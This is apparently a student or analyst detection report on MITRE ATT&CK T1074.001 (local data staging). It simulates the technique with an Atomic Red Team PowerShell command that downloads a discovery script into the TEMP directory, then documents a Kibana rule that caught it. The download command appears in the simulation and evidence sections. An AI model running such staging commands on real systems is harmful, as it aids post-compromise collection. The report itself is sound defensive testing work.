# Detection Report: T1074.001 – Data Staged 

**Technique:** Local Data Staging

---

## 1. Technique Overview

**Technique ID:** T1074.001
**Technique Name:** Local Data Staging
**Tactic:** Collection  
**Platform:** Windows

**Description:**  
Local Data Staging is a collection technique used by adversaries to aggregate and store collected information locally on a compromised system prior to exfiltration. By staging data locally, attackers can control when and how information is transmitted, reduce network-based detection opportunities, and organize reconnaissance output efficiently.

On Windows systems, attackers commonly leverage PowerShell and batch scripts to gather system data and write the results to temporary directories that are writable by standard users and less closely monitored.

---

## 2. Attack Simulation

**Test Framework:** Atomic Red Team  
**Atomic Test Number:** Test #1  
**Execution Method:** Evil-WinRM from Kali Linux to Windows 10 VM

**Command Executed:**
```  "\"powershell.exe\" & {Invoke-WebRequest \\\"\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\\\"\" -OutFile $env:TEMP\\discovery.bat}"
```

**Command Breakdown:**
- `"powershell.exe"` - Launches the Windows PowerShell interprete
- `Invoke-WebRequest` - Performs an HTTPS request to download remote content
- `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat` - Remote batch script containing multiple discovery commands
- `-OutFile $env:TEMP\discovery.bat` - Writes the downloaded script to the local TEMP directory, staging it on disk
- `& { … }` - Executes the PowerShell command block within the current session

**Why this is malicious:**  
While downloading scripts via PowerShell can be legitimate, this behavior is suspicious when performed post-compromise. The script is designed to collect system and environment information and stage the output locally. This staged data can later be exfiltrated or used to guide further attacker actions, making it a key indicator of collection activity.

---

## 3. Detection Configuration

**SIEM Platform:** Elastic Stack (Elasticsearch + Kibana)  
**Data Source:** Sysmon Event ID 1 (Process Creation)  
**Collection Agent:** Winlogbeat  
**Event Channel:** Microsoft-Windows-Sysmon/Operational

**Kibana Detection Rule:**
```kql
winlog.channel: "Microsoft-Windows-Sysmon/Operational"
AND event.code: "1"
AND process.name: "powershell.exe"
AND process.command_line.text: "*Discovery.bat*"
```

**Detection Logic:**
- Monitors Sysmon Event ID 1 (Process Creation)
- Filters for PowerShell execution
- Identifies download of a discovery script
- Detects local staging behavior aligned with T1074.001

**Why this works:**  
Downloading and staging discovery scripts locally is uncommon in normal user workflows. When PowerShell retrieves external scripts and stores them in temporary directories, especially during remote or high-integrity execution, it strongly indicates attacker-controlled collection and preparation activity.

---

## 4. Test Results

**Status:** ✅ Successfully Detected

**Alert Details:**
- **Alert Triggered:** Yes, in Kibana Security Alerts interface
- **Timestamp:** Jan 26, 2026 @ 19:49:11.438
- **Severity:** High
- **Host:** DESKTOP-K1Q1TJA

**Evidence Collected:**
- **Process Name:** powershell.exe
- **Command Line:** `"\"powershell.exe\" & {Invoke-WebRequest \\\"\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\\\"\" -OutFile $env:TEMP\\discovery.bat}"`
- **Parent Process:** wsmprovhost.exe
- **User:** Administrator
- **integrity level:** High
- **Execution Context:** Remote PowerShell session
- **Working Directory:** `C:\Users\ADMINI~1\AppData\Local\Temp\`
- **Process ID:** 2372

**Observations:**
The PowerShell process downloaded a discovery script into the TEMP directory under a high-integrity context. This behavior is consistent with adversary-driven data staging following initial access and discovery.

---

## 5. Sigma Rule Effectiveness

**Rule Performance:** Effective  
**Alert Accuracy:** True Positive

**Strengths:**
- Detects script-based local staging activity
- Leverages high-fidelity Sysmon telemetry
- Easy to extend for additional staging indicators

---

## 6. False Positive Analysis

**Potential False Positives:**

1. **Legitimate Administrative Automation**
   - PowerShell scripts downloading resources for setup or maintenance

2. **Security Testing Activities**
   - Red team or penetration testing frameworks

3. **Software Deployment Scripts**
   - Automated installation or update processes

**Likelihood:** Medium

**Mitigation Strategies:**
- Exclude known management servers or service accounts
- Correlate with subsequent file execution or exfiltration
- Combine with discovery, credential access, or lateral movement detections

---

## 7. Conclusion

The detection successfully identified Local Data Staging activity consistent with T1074.001. The observed PowerShell behavior reflects attacker preparation for data collection and exfiltration. While script downloads can be legitimate, the execution context, temporary staging location, and alignment with discovery activity provide strong evidence of post-exploitation collection behavior.

---

## References

- MITRE ATT&CK T1033: https://attack.mitre.org/techniques/T1074/001/
- Atomic Red Team: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1074.001.md